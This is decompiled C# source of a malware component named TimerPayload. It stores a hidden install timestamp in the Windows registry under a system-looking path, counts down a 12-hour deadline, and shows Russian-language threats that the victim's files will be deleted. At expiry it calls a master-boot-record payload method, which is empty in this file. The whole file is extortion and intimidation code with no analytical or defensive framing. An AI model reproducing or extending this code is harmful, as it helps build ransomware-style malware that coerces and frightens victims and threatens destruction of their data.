using System;
using Microsoft.Win32;

namespace ns0
{
	// Token: 0x02000022 RID: 34
	public static class TimerPayload
	{
		// Token: 0x060000BA RID: 186 RVA: 0x0000A5B4 File Offset: 0x000087B4
		public static void CheckAndExecute()
		{
			try
			{
				bool flag = TimerPayload.GetRemainingTime().TotalSeconds <= 0.0;
				if (flag)
				{
					TimerPayload.ExecuteMBRPayload();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000BB RID: 187 RVA: 0x0000A604 File Offset: 0x00008804
		public static TimeSpan GetRemainingTime()
		{
			TimeSpan timeSpan2;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion"))
				{
					bool flag = registryKey != null;
					if (flag)
					{
						object value = registryKey.GetValue("InstallTime");
						long num = 0L;
						bool flag2 = value != null && long.TryParse(value.ToString(), out num);
						if (flag2)
						{
							DateTime dateTime = new DateTime(num);
							DateTime dateTime2 = dateTime.AddHours(12.0);
							TimeSpan timeSpan = dateTime2 - DateTime.Now;
							return (timeSpan.TotalSeconds > 0.0) ? timeSpan : TimeSpan.Zero;
						}
					}
				}
				using (RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion"))
				{
					registryKey2.SetValue("InstallTime", DateTime.Now.Ticks.ToString());
				}
				timeSpan2 = TimeSpan.FromHours(12.0);
			}
			catch
			{
				timeSpan2 = TimeSpan.FromHours(12.0);
			}
			return timeSpan2;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x0000A740 File Offset: 0x00008940
		private static void ExecuteMBRPayload()
		{
			try
			{
			}
			catch
			{
			}
		}

		// Token: 0x060000BD RID: 189 RVA: 0x0000A768 File Offset: 0x00008968
		public static string GetFormattedTimer()
		{
			string text;
			try
			{
				TimeSpan remainingTime = TimerPayload.GetRemainingTime();
				bool flag = remainingTime.TotalSeconds <= 0.0;
				if (flag)
				{
					text = "⚠\ufe0f ВРЕМЯ ИСТЕКЛО ⚠\ufe0f";
				}
				else
				{
					int num = (int)remainingTime.TotalHours;
					int minutes = remainingTime.Minutes;
					int seconds = remainingTime.Seconds;
					text = string.Format("⚠\ufe0f Файлы будут УДАЛЕНЫ через: {0}ч {1}м {2}с ⚠\ufe0f", num, minutes, seconds);
				}
			}
			catch
			{
				text = "";
			}
			return text;
		}

		// Token: 0x04000078 RID: 120
		private const int DEADLINE_HOURS = 12;

		// Token: 0x04000079 RID: 121
		private const string REG_PATH = "Software\\Microsoft\\Windows\\CurrentVersion";

		// Token: 0x0400007A RID: 122
		private const string REG_VALUE_NAME = "InstallTime";
	}
}
